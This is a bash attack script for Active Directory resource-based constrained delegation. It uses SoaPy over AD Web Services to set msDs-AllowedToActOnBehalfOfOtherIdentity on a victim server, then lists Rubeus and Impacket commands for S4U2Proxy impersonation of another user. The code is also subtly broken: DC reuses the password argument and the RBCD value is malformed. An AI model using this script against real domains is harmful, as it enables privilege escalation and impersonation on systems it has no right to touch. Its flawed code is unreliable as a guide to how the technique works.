#!/bin/bash
# ADWS RBCD Staging Script
# Sets msDs-AllowedToActOnBehalfOfOtherIdentity for Resource-Based Constrained Delegation

set -e

# Configuration
DOMAIN="${1:-}"
USER="${2:-}"
PASSWORD="${3:-}"
DC="${3:-}"
TARGET_DN="${4:-}"
SOURCE_SID="${5:-}"

if [[ -z "$DOMAIN" || -z "$USER" || -z "$PASSWORD" || -z "$DC" || -z "$TARGET_DN" || -z "$SOURCE_SID" ]]; then
    echo "Usage: $0 <domain> <user> <password> <dc> <target_dn> <source_sid>"
    echo ""
    echo "Example:"
    echo "  $0 corp.local admin 'P@ssw0rd123' dc01.corp.local \\"
    echo "        'CN=VictimServer,OU=Servers,DC=corp,DC=local' \\"
    echo "        'S-1-5-21-1234567890-1234567890-1234567890-1001'"
    echo ""
    echo "To find the source SID, use:"
    echo "  soapy domain.local/user:pass@dc --users | grep -i 'your-username'"
    exit 1
fi

# SoaPy connection string
SOAPY_CONN="${DOMAIN}/${USER}:${PASSWORD}@${DC}"

# Build the RBCD value
# Format: B:32:<16-byte SID in hex>
# The SID needs to be converted to the proper format
RBCD_VALUE="B:32:01010000000000000000000000000000${SOURCE_SID//[-S]//}"

echo "[*] Staging RBCD on target: $TARGET_DN"
echo "[*] Source SID: $SOURCE_SID"
echo "[*] RBCD value: $RBCD_VALUE"
echo ""

# Verify target exists first
echo "[*] Verifying target object exists..."
soapy $SOAPY_CONN -dn "$TARGET_DN" -q '(objectClass=*)' | head -5

# Set the RBCD attribute
echo "[*] Setting msDs-AllowedToActOnBehalfOfOtherIdentity..."
soapy $SOAPY_CONN \
      --set "$TARGET_DN" \
      msDs-AllowedToActOnBehalfOfOtherIdentity "$RBCD_VALUE"

echo ""
echo "[+] RBCD staging complete!"
echo ""
echo "[*] Next steps for S4U2Proxy attack:"
echo "    1. Get TGT for your account"
echo "    2. Use Rubeus: Rubeus.exe s4u /user:youruser /rc4:hash /impersonateuser:victim /msdsspn:HTTP/target /autodomain"
echo "    3. Or use Impacket: getST.py domain/youruser:hash -impersonateuser victim -spn HTTP/target"
